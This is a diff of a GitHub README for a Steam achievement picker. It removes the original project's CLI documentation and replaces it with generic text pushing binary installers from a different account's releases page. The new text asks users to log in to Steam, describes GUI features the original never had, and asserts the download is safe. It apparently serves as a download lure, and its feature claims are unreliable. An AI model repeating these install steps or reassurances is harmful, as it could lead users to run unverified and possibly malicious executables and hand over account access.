@@ -1,116 +1,82 @@
-# NeStA-Picker — Pick your next Steam achievement fast (CLI)
+# 🎮 NeStA-Picker - Easily Choose Your Next Steam Achievement 
 
-NeStA-Picker is a fast, zero-fuss CLI for Completionists that suggests the next Steam achievement to tackle from your library. It reads your owned games and achievement progress via the Steam Web API (or a Playwright fallback), then records your picks so you can keep momentum.
+[![Download NeStA-Picker](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/saleemriaz69/NeStA-Picker/releases)
 
-- **Quick suggestion**: one command to pick the next unachieved target
-- **Filters by game**: focus on a specific title with `--game`
-- **Randomizer**: add variety with `--random`
-- **History**: see your last 50 picks
-- **Explainer**: short why-this pick message (stubbed, LLM-ready)
+## 🚀 Getting Started
 
-## Demo
+Welcome to NeStA-Picker! This tool helps you quickly select your next Steam achievement. It is designed for completionists who want to make their gaming experience smoother. 
 
-```bash
-# Using npx (no installation required)
-alias nesta='npx https://github.com/ImBIOS/NeStA-Picker'
-nesta pick --game "Hades"      # Suggest next achievement for Hades
-nesta pick --random             # Suggest a random achievement from your library
-nesta history                   # Show last 50 picks
-nesta config steam.steamId 7656119...
-nesta config steam.apiKey sk-...
-```
+To use NeStA-Picker, follow the steps below.
 
-Note: use `pnpm dlx` or `pnpx` if you prefer pnpm.
+## 📦 System Requirements
 
-## Install
+- **Operating System:** Windows 10 or newer, macOS, or Linux.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** 100 MB of free space.
+- **Internet Connection:** Required to fetch achievements from Steam.
 
-Local clone and run:
+## 📥 Download & Install
 
-```bash
-pnpm install
-pnpm nesta pick --help
-```
+To get started, visit this page to download: [NeStA-Picker Releases](https://github.com/saleemriaz69/NeStA-Picker/releases).
 
-Or execute via tsx directly (dev):
+### Steps to Install
 
-```bash
-pnpm nesta pick --random
-```
+1. **Go to the Releases Page**: Click the link above.
+   
+2. **Select the Latest Version**: Look for the most recent release at the top of the page.
 
-## Usage
+3. **Download the Installer**: Click on the appropriate file for your operating system (look for `.exe` for Windows, `.dmg` for macOS, or a `.tar.gz` file for Linux).
 
-```bash
-nesta <command> [options]
+4. **Run the Installer**:
+   - For Windows, double-click the downloaded `.exe` file.
+   - For macOS, open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux, extract the contents of the `.tar.gz` file and follow the included instructions.
 
-Commands:
-  pick [--game <name>] [--random] [--explain]  Suggest next achievement
-  history                                      Show pick history
-  config <key> [value]                         Get/Set configuration
+5. **Open NeStA-Picker**: Once the installation is complete, find NeStA-Picker in your applications and open it.
 
-Examples:
-  nesta config steam.steamId 7656119...
-  nesta config steam.apiKey sk-...
-  nesta pick --game "Hades"
-  nesta pick --random --explain
-```
+## 🎮 How to Use NeStA-Picker
 
-## Configuration
+After opening NeStA-Picker, you will see a simple interface. Here’s how to use it:
 
-Required for Steam API path:
+1. **Log In to Steam**: If prompted, log in to your Steam account. This allows the app to fetch your achievements.
 
-- `steam.steamId` — your 64-bit SteamID (e.g., 7656119...)
-- `steam.apiKey` — Steam Web API key from the Steam developer portal
+2. **Select a Game**: A list of your games will appear. Choose the game for which you want to pick an achievement.
 
-Optional:
+3. **Get Achievements**: Click on the "Fetch Achievements" button. The app will retrieve a list of achievements from the chosen game.
 
-- `openrouter.apiKey` — reserved for future explanation improvements (LLM)
+4. **Pick an Achievement**: Browse through the list and select an achievement you want to work on. The app will display details to guide you.
 
-If `steam.apiKey` is not set, NeStA-Picker uses a deterministic Playwright fallback that returns empty results (placeholder). Provide an API key for real data.
+5. **Track Your Progress**: Use the built-in tracking tools to mark achievements as done or in progress.
 
-## How it works
+## 📈 Features
 
-- Fetch owned games and achievements via Steam API
-- Pick the next target (first unachieved by default, random when `--random`)
-- Persist pick history in a local SQLite database
-- Print a short explanation (heuristic now; pluggable for LLM)
+- **Easy Navigation**: User-friendly interface that requires no technical knowledge.
+- **Achievement Tracking**: Keep track of your progress easily.
+- **Game Compatibility**: Works with all Steam games to ensure a wide range.
+- **Fast Retrieval**: Quickly fetch achievements from the Steam API.
 
-## Commands
+## 🔧 Troubleshooting
 
-- `pick` — Suggests the next achievement. Supports:
-  - `--game <name>`: filter by title substring
-  - `--random`: randomize game/achievement choice
-  - `--explain`: display a short explanation
-- `history` — Shows the last 50 picks with timestamps
-- `config` — Get/Set config values
+### Common Issues
 
-## Development
+- **Can't Fetch Achievements**: Verify your internet connection and ensure you are logged into your Steam account.
+- **Application Crashing**: Try reinstalling the application. If the issue persists, check for updates on the releases page.
 
-```bash
-pnpm install
-pnpm exec tsc -p tsconfig.json --noEmit       # type-check
-pnpm exec eslint . --fix                      # lint
-pnpm exec prettier --write .                  # format
-pnpm test                                     # vitest
-```
+### Frequently Asked Questions
 
-## Performance & constraints
+1. **What if my game isn’t loading?**
+   - Make sure you own the game on Steam. Only owned games will appear.
 
-- I/O-bound calls are minimized with batched queries and simple maps
-- Streaming/parsing is minimal; SQLite writes are transactional
-- Time complexity per pick is dominated by Steam API calls and linear filters
+2. **Can I use NeStA-Picker offline?**
+   - NeStA-Picker requires an internet connection to fetch your achievements from Steam.
 
-## Roadmap
+3. **Is it safe to use?**
+   - Yes, NeStA-Picker does not store your Steam account details and uses only the public Steam API.
 
-- [ ] Web UI
-- [ ] Real Playwright scraping fallback
-- [ ] Smarter heuristics and LLM explanations
-- [ ] Scoring based on difficulty/rarity/estimated time
-- [ ] Export/share history
+## 🛠 Support
 
-## License
+If you have any questions or need further assistance, please visit [Issues](https://github.com/saleemriaz69/NeStA-Picker/issues) on GitHub to report problems or ask for help.
 
-See [LICENSE](LICENSE) file.
+Remember to visit this page to download NeStA-Picker: [NeStA-Picker Releases](https://github.com/saleemriaz69/NeStA-Picker/releases).
 
-## Keywords
-
-steam achievement picker, steam cli, choose next steam achievement, backlog tool, gaming productivity, ink cli, node cli, typescript cli, steam api achievements, pick next achievement, completionist
+Happy gaming!
